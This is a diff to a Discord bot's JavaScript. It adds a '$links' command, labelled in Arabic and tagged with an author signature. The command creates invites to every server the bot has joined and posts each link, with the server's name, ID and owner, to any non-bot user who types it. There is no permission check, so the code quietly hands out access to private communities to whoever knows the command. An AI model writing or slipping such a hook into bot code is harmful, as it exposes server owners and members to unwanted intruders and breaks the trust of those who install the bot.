@@ -120,6 +120,34 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 }
 });
 
+client.on("message", msg => {
+//Shady Craft YT#4176
+  if (msg.author.bot) return;
+//Shady Craft YT#4176
+  if (msg.content === "$links") {//Shady Craft YT#4176
+    client.guilds.forEach(g => {//Shady Craft YT#4176
+      
+      let l = g.id;
+      g.channels
+        .get(g.channels.first().id)
+        .createInvite({//Shady Craft YT#4176
+          maxUses: 10,
+          maxAge: 86400
+        })//Shady Craft YT#4176
+        .then(i =>
+          msg.channel.send(`
+        **
+        اقصى الاستخدام : mem 10
+        رابط السيرفر : <https://discord.gg/${i.code}>
+        السيرفر : ${g.name} | Id : ${g.id}//Shady Craft YT#4176
+        صاحب السيرفر : ${g.owner} 
+        **
+        `)
+        ); //g.owner.id
+    });
+  }
+});
+
 
 
 client.login(process.env.TOKEN);
